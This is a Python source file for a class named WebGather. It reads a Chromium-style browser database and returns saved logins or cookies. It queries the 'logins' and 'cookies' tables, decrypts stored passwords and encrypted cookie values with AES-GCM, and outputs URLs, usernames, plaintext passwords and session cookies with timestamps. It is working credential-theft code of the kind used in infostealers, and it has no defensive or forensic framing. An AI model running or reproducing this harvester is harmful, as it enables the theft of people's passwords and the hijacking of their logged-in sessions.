from Crypto.Cipher import AES
import sqlite3
import datetime

class WebGather(object):

    def __init__(self, path, key, cred_type):
        self.path = path
        self.key = key
        self.cred_type = cred_type

    def decrypt_password(self, key, iv, en_pass):
        try:
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(en_pass)[:-16].decode()
        except Exception as e:
            print(e)
            return 'null'

    def extract_time(self, micro_time):
        return str(datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=micro_time))

    def show_credentials(self):
        query = {
            "password": """SELECT origin_url,
                          date_last_used, 
                          date_created, 
                          username_value, 
                          password_value 
                   FROM logins 
                   ORDER BY date_created""",
            "cookies": """SELECT host_key,
                          value, 
                          creation_utc, 
                          last_access_utc, 
                          expires_utc, 
                          encrypted_value 
                   FROM cookies"""
        }.get(self.cred_type)
        records = self.fetch_records(self.path, query)
        if self.cred_type == "password":
            return [self.process_password_record(i) for i in records]  
        return [self.process_cookie_record(i) for i in records]  

    def fetch_records(self, path, query):
        with sqlite3.connect(path) as conn:
            cursor = conn.cursor()
            cursor.execute(query)
            records = cursor.fetchall()[::-1]
        return records

    def process_password_record(self, record):
        url, last, created, user, password = record
        password = self.decrypt_password(self.key, password[3:15], password[15:])
        last, created = self.extract_time(last), self.extract_time(created)
        return {"url": url, "created": created, "last": last, "user": user, "password": password}

    def process_cookie_record(self, record):
        domain, value, created, last, expires, encrypted_value = record
        if not value:
            password = self.decrypt_password(self.key, encrypted_value[3:15], encrypted_value[15:])
        else:
            password = value
        if domain[0] == '.':
            domain = domain[1:]
        last, created, expires = self.extract_time(last), self.extract_time(created), self.extract_time(expires)
        return {"domain": domain, "created": created, "last": last, "expires": expires, "decrypted_cookie": password}
